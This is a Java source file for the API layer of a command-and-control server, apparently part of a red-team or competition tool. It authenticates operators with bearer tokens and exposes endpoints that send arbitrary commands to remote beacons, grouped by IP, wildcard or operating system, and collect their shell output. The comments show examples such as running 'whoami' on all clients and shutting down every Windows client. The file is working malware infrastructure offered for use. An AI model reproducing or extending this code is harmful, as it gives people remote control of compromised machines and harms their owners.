package Servers.C2;

import java.io.*;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Map;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import com.sun.net.httpserver.*;

import org.json.JSONArray;
import org.json.JSONObject;


public class C2ServerAPI implements Runnable {
    // Pointer back to the C2 Server
    private C2Server C2server; 

    // Maps that store data about bearer tokens. ConcurrentHashMap so the API
    // handler threads and the background sweeper can touch them safely.
    private ConcurrentHashMap<String, String> bearerTokens;
    private ConcurrentHashMap<String, Instant> bearerTokensExpirationTime;

    // Bearer token lifetime in seconds (one hour, matching the ttl reported by /auth)
    private static final long TOKEN_TTL_SECONDS = 3600;

    // Secure Random Number Generator used to generate bearer tokens
    private final SecureRandom secRNG;

    // Single daemon thread that periodically evicts expired bearer tokens
    private final ScheduledExecutorService tokenSweeper;

    public C2ServerAPI(C2Server C2server){
        this.C2server = C2server;
        this.secRNG = new SecureRandom();
        this.bearerTokens = new ConcurrentHashMap<>();
        this.bearerTokensExpirationTime = new ConcurrentHashMap<>();
        this.tokenSweeper = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "bearer-token-sweeper");
            t.setDaemon(true);
            return t;
        });
    }

    /**
     * Generates a oauth2 bearer token. This token is presented to a client once they have successfully authenticated
     * The client must present this token each time they attempt to use the API after this. The token is valid for one hour
     * @param username - username that this token is associated with
     * @return bearer token
     */
    private String generateBearerToken(String username){
        String hexChars = "0123456789abcdef";
        StringBuilder hexString = new StringBuilder(32);
        for (int i = 0; i < 32; i++) {
            hexString.append(hexChars.charAt(secRNG.nextInt(hexChars.length())));
        }
        bearerTokens.put(hexString.toString(), username);
        bearerTokensExpirationTime.put(hexString.toString(), Instant.now().plusSeconds(TOKEN_TTL_SECONDS));
        return hexString.toString();
    }

    /**
     * Determines whether or not a oauth2 bearer token that has been presented is valid
     * 
     * @param bearerToken - bearer token to be validated
     * @return true or false
     */
    private boolean validateBearerToken(String bearerToken){
        Instant expiry = bearerTokensExpirationTime.get(bearerToken);
        if(expiry != null){
            if(Instant.now().isBefore(expiry)){
                return true;
            }
            // Token has expired; reclaim it now instead of waiting for the sweep
            bearerTokens.remove(bearerToken);
            bearerTokensExpirationTime.remove(bearerToken);
        }
        return false;
    }

    /**
     * Used to revoke all bearer tokens granted to a user
     * @param username - user that should have their tokens revoked
     */
    private void removeUserBearerTokens(String username){
        ArrayList<String> badTokens = new ArrayList<>();
        for(String token : bearerTokens.keySet()){
            if(bearerTokens.get(token).equals(username)){
                badTokens.add(token);
            }
        }

        for(String token : badTokens){
            bearerTokens.remove(token);
            bearerTokensExpirationTime.remove(token);
        }
    }

    /**
     * Removes all expired bearer tokens from both maps. Run periodically by the
     * tokenSweeper so abandoned tokens (issued but never presented again) don't
     * accumulate for the life of the process.
     */
    private void purgeExpiredTokens(){
        Instant now = Instant.now();
        for(Map.Entry<String, Instant> entry : bearerTokensExpirationTime.entrySet()){
            if(now.isAfter(entry.getValue())){
                String token = entry.getKey();
                bearerTokens.remove(token);
                bearerTokensExpirationTime.remove(token);
            }
        }
    }


    public class MyHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange t) throws IOException {
            
            String response = "";
            // Encoded body, filled in per-branch so we encode once (header length + write)
            byte[] responseBytes = new byte[0];

            // Read the Authorization header safely (null if absent) and pull out the bearer
            // token, so a missing or malformed header yields a clean 4xx instead of a 500.
            String authHeader = t.getRequestHeaders().getFirst("Authorization");
            String bearerToken = null;
            if(authHeader != null){
                String[] authParts = authHeader.split(" ");
                if(authParts.length > 1){
                    bearerToken = authParts[1];
                }
            }

            /**
             * There are 6 different RESTful API calls available currently
             * 
             * /auth
             * The Client will use basic authentication to present a username and password
             * and will receive a oauth2 bearer token
             * 
             * Example:
             * 
             * curl -u root:password http://localhost:7000/auth
             * 
             * Output:
             * 
             * {"bearer":"oauth2bearertoken","ttl",3600}
             * 
             * 
             * 
             * Note: Every other request requires presenting a valid bearer token, previously obtained from the /auth call
             * 
             * /command
             * Sends a command to a specific number of clients, determined by the scope
             * 
             * Example (sends whoami to all clients):
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"x.x.x.x","command":"whoami"}' http://localhost:7000/command
             * 
             * Example (sends ipconfig to one client):
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"192.168.1.1","command":"ipconfig"}' http://localhost:7000/command
             * 
             * Example (shutsdown all windows clients):
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"Windows","command":"shutdown /t 0"}' http://localhost:7000/command
             * 
             * Output (for any command run):
             * 
             * {"output":"success"}
             * 
             * 
             * 
             * /shell
             * Does the same thing as /command, except the output (std.out) is returned right away. scope should only be one ip address
             * 
             * Example:
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"192.168.1.1","command":"whoami"}' http://localhost:7000/shell
             * 
             * Output:
             * 
             * {"output":"root"}
             * 
             * 
             * /responses
             * Returns all responses from clients specified by scope
             * 
             * Example:
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"x.x.x.x"}' http://localhost:7000/responses
             * 
             * Output:
             * 
             * {"192.168.229.136":["nt authority\\system"],"192.168.229.128":[]}
             * 
             * 
             * 
             * /status
             * Gets the status of all clients. It attempts to run whoami on all systems, and if the correct output is returned, then the status is true
             * 
             * 
             * Example:
             * 
             * curl --oauth2-bearer oauth2bearertoken http://localhost:7000/status
             * 
             * Output:
             * 
             * {"192.168.229.136":false,"192.168.229.128":true}
             * 
             * 
             * 
             * 
             * /user
             * Adds a user to the C2 Server, or changes the password of a user in the C2 Server
             * NOTE: This endpoint is only accessible to the root user (i.e. username "root" and root's password must've been used to generate bearer token used)
             * 
             * Example:
             * 
             * curl --oauth2-bearer oauth2bearertoken -d '{"username":"username","password","password"}' http://localhost:7000/user
             * 
             * Output:
             * 
             * {"output": "success"}
             * 
             * 
             * /messages
             * Gets generic messages from the C2 Server, such as new clients, lost clients, lost beacons
             * 
             * Example
             * curl --oauth2-bearer oauth2bearertoken -d '{"Messages Read":0}' http://localhost:7000/user
             * 
             * Output:
             * 
             * ["New Linux client at 192.168.1.1", "Lost Windows Client at 10.0.0.1"]
             */
            // First, the client needs to present their username and password, to get a BEARER token
            if(t.getRequestMethod().equals("OPTIONS")){
                t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
                t.getResponseHeaders().add("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
                t.getResponseHeaders().add("Access-Control-Allow-Headers", "Authorization, Content-Type");
                t.sendResponseHeaders(204, -1);
            } else if(t.getRequestURI().toString().equals("/auth") && t.getRequestMethod().equals("GET")){
                if(authHeader != null && authHeader.startsWith("Basic ")){
                    String username = null;
                    String password = null;
                    try {
                        String userpass = new String(Base64.getDecoder().decode(authHeader.substring(6)));
                        // Split on the first colon only, so a password containing ':' is kept intact
                        int sep = userpass.indexOf(':');
                        if(sep >= 0){
                            username = userpass.substring(0, sep);
                            password = userpass.substring(sep + 1);
                        }
                    } catch (IllegalArgumentException e){
                        // Malformed Base64: leave credentials null so this is treated as invalid
                    }
                    if(username != null && C2server.authenticate(username, C2Server.hashPassword(password))){
                        String newBearerToken = generateBearerToken(username);
                        JSONObject jsonBearerObject = new JSONObject();
                        jsonBearerObject.put("ttl", TOKEN_TTL_SECONDS);
                        jsonBearerObject.put("bearer", newBearerToken);
                        response = jsonBearerObject.toString();
                        responseBytes = response.getBytes(StandardCharsets.UTF_8);
                        t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
                        t.sendResponseHeaders(200, responseBytes.length);
                    } else {
                        JSONObject jsonBearerObject = new JSONObject();
                        jsonBearerObject.put("error", "Invalid Credentials");
                        response = jsonBearerObject.toString();
                        responseBytes = response.getBytes(StandardCharsets.UTF_8);
                        t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
                        t.sendResponseHeaders(401, responseBytes.length);
                    }
                } else {
                    // Missing or non-Basic Authorization header: respond cleanly instead of
                    // falling through with no headers sent (which would throw at getResponseBody()).
                    JSONObject jsonBearerObject = new JSONObject();
                    jsonBearerObject.put("error", "Invalid Credentials");
                    response = jsonBearerObject.toString();
                    responseBytes = response.getBytes(StandardCharsets.UTF_8);
                    t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
                    t.sendResponseHeaders(401, responseBytes.length);
                }
            } else if (bearerToken != null && validateBearerToken(bearerToken)){
                if(t.getRequestURI().toString().equals("/status") && t.getRequestMethod().equals("GET")){
                    JSONObject clientStatusJSONObject = new JSONObject(C2server.getClientStatus()); 
                    response = clientStatusJSONObject.toString();
                } else if (t.getRequestURI().toString().equals("/dnsstatus") && t.getRequestMethod().equals("GET")) {
                    JSONObject clientStatusJSONObject = new JSONObject(C2server.getDnsClientStatus()); 
                    response = clientStatusJSONObject.toString();
                } else if (t.getRequestURI().toString().equals("/responses") && t.getRequestMethod().equals("POST")){
                    // Proper scopes are Linux, Windows, or an ipv4 address, (wildcards are excepted, i.e. 192.168.x.1)
                    JSONObject responseScope = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                    JSONObject responses = new JSONObject(C2server.getClientResponses(responseScope.get("scope").toString()));
                    
                    response = responses.toString();
                } else if (t.getRequestURI().toString().equals("/command") && t.getRequestMethod().equals("POST")){
                    JSONObject commandJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                    String scope = commandJSON.get("scope").toString();
                    String command = commandJSON.get("command").toString();
                    C2server.distributeCommandToBeacons(scope, command);

                    JSONObject returnObject = new JSONObject();
                    returnObject.put("output", "success");
                    response = returnObject.toString();

                } else if (t.getRequestURI().toString().equals("/shell") && t.getRequestMethod().equals("POST")){
                    JSONObject shellJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                    String scope = shellJSON.get("scope").toString();
                    String command = shellJSON.get("command").toString();
                    try{
                        // /shell targets a single IP; block for that client's output
                        String shellResponse = C2server.getShellResponse(scope, command);

                        JSONObject returnObject = new JSONObject();
                        returnObject.put("output", shellResponse);
                        response = returnObject.toString();
                    } catch (Exception e){
                        JSONObject returnObject = new JSONObject();
                        returnObject.put("error", "shell unavailable");
                        response = returnObject.toString();
                    }           

                    
                } else if (t.getRequestURI().toString().equals("/user") && t.getRequestMethod().equals("POST") && "root".equals(bearerTokens.get(bearerToken))){
                    JSONObject userJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                    String action = userJSON.get("type").toString();
                    if(action.equals("add")){
                        String username = userJSON.get("username").toString();
                        String password = userJSON.get("password").toString();
                        C2server.updateUsernamePassword(username, C2Server.hashPassword(password));
                    } else if (action.equals("disable")){
                        String username = userJSON.get("username").toString();
                        C2server.disableUser(username);
                        try{
                            removeUserBearerTokens(username);
                        } catch(Exception e){
                            e.printStackTrace();
                        }
                    }

                    JSONObject returnObject = new JSONObject();
                    returnObject.put("output", "success");
                    response = returnObject.toString();

                } else if (t.getRequestURI().toString().equals("/messages") && t.getRequestMethod().equals("POST")){
                    JSONObject messageJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                    int numMessagesRead = Integer.parseInt(messageJSON.get("Messages Read").toString());
                    JSONArray messageListJSON = new JSONArray(C2server.getUserMessages(numMessagesRead));
                    response = messageListJSON.toString();
                }
                t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
                t.getResponseHeaders().set("Content-Type", "application/json");
                responseBytes = response.getBytes(StandardCharsets.UTF_8);
                t.sendResponseHeaders(200, responseBytes.length);
            } else {
                JSONObject jo = new JSONObject();
                // If the token is expired and the client just needs to ask for a new one, they get a 401 unauthorized
                // If the user has been disabled, or they just use a invalid token, they get a 403 forbidden
                if(bearerToken != null && bearerTokens.keySet().contains(bearerToken)){
                    jo.put("error", "expired token");
                    response = jo.toString();
                    responseBytes = response.getBytes(StandardCharsets.UTF_8);
                    t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
                    t.sendResponseHeaders(401, responseBytes.length);
                } else {
                    jo.put("error", "invalid token");
                    response = jo.toString();
                    responseBytes = response.getBytes(StandardCharsets.UTF_8);
                    t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
                    t.sendResponseHeaders(403, responseBytes.length);
                }
                
            }
            
            
            OutputStream os = t.getResponseBody();
            os.write(responseBytes);
            os.close();
        }
    }

    @Override
    public void run() {
        try {
            //////////////// HTTP Server ////////////////
            
            InetSocketAddress httpAddress = new InetSocketAddress(7000);
            HttpServer httpServer = HttpServer.create(httpAddress, 0);

            httpServer.createContext("/command", new MyHandler());
            httpServer.createContext("/shell", new MyHandler());
            httpServer.createContext("/response", new MyHandler());
            httpServer.createContext("/status", new MyHandler());
            httpServer.createContext("/dnsstatus", new MyHandler());
            httpServer.createContext("/auth", new MyHandler());
            httpServer.createContext("/user", new MyHandler());
            httpServer.createContext("/messages", new MyHandler());
           
            httpServer.setExecutor(new ThreadPoolExecutor(4, 8, 30, TimeUnit.SECONDS, new ArrayBlockingQueue<Runnable>(100)));
            httpServer.start();

            // Periodically evict expired bearer tokens so the maps don't grow unbounded
            tokenSweeper.scheduleAtFixedRate(this::purgeExpiredTokens, 10, 10, TimeUnit.MINUTES);

        } catch (Exception exception) {
            System.out.println("Failed to create API Server");
            exception.printStackTrace();
        }
    }
}
